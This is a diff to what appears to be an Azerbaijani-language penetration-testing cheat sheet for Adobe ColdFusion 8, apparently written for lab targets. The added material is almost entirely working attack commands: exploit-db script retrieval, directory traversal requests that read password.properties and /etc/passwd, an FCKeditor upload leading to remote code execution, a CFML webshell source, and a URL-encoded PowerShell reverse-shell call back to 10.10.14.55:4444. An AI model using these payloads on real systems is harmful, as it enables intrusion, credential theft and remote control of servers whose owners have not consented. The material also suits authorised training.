@@ -50,27 +50,56 @@ administrator:administrator
 
 # Metasploit
 ```powershell
-# Exploit axtarışı
-searchsploit coldfusion
+searchsploit adobe coldfusion
 
-# Metasploit modulları
-msfconsole
-search coldfusion
+# Əsas nəticələr:
+# Adobe ColdFusion - Directory Traversal        → 14641.py
+# Adobe ColdFusion 8 - RCE                      → 50057.py
+# Adobe ColdFusion 9 - Auth Bypass              → 27755.txt
+
+# Exploit-i kopyala
+searchsploit -p 14641
+cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+
+searchsploit -p 50057
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
 ```
 
 # ColdFusion 8 — Directory Traversal (CVE-2010-2861)
 ```powershell
+/CFIDE/administrator/settings/mappings.cfm
+/CFIDE/administrator/logging/settings.cfm
+/CFIDE/administrator/datasources/index.cfm
+/CFIDE/administrator/j2eepackaging/editarchive.cfm
+/CFIDE/administrator/enter.cfm
+/CFIDE/wizards/common/_logintowizard.cfm
+/CFIDE/wizards/common/_authenticatewizarduser.cfm
+
 # Admin şifrə hash-ini oxu
 curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"
 
 # Windows path
 curl "http://<TARGET>:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en"
 
+# İstifadə
+python2 14641.py <HOST> <PORT> <FILE_PATH>
+
+# Nümunə - Windows
+python2 14641.py 10.129.204.230 8500 \
+  "../../../../../../../../ColdFusion8/lib/password.properties"
+
+# Nümunə - Linux
+python2 14641.py 10.129.204.230 8500 \
+  "../../../../../../../../etc/passwd"
+
 hashcat -m 100 <HASH> /usr/share/wordlists/rockyou.txt
 ```
 
 # ColdFusion 8 — File Upload → RCE (CVE-2009-2265)
 ```powershell
+/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
+  ?Command=FileUpload&Type=File&CurrentFolder=
+
 # Metasploit ilə
 msfconsole
 use exploit/windows/http/coldfusion_fckeditor
@@ -87,6 +116,27 @@ run
 
 curl -F "newfile=@shell.cfm" \
   "http://<TARGET>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
+```
 
+# Manual WebShell
+```powershell
+# CFML webshell faylı yarat (shell.cfm)
+cat > shell.cfm << 'EOF'
+<cfexecute name="cmd.exe" 
+  arguments="/c #url.cmd#" 
+  timeout="5" 
+  variable="output">
+</cfexecute>
+<cfoutput>#output#</cfoutput>
+EOF
 
+# FCKeditor vasitəsilə upload et
+curl -F "newfile=@shell.cfm" \
+  "http://<TARGET>:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
+
+# Webshell-i istifadə et
+curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=whoami"
+curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=ipconfig"
+
+curl "http://<TARGET>:8500/userfiles/file/shell.cfm?cmd=powershell+-nop+-c+%22%24client+%3D+New-Object+System.Net.Sockets.TCPClient%28%2710.10.14.55%27%2C4444%29%3B%22"
 ```
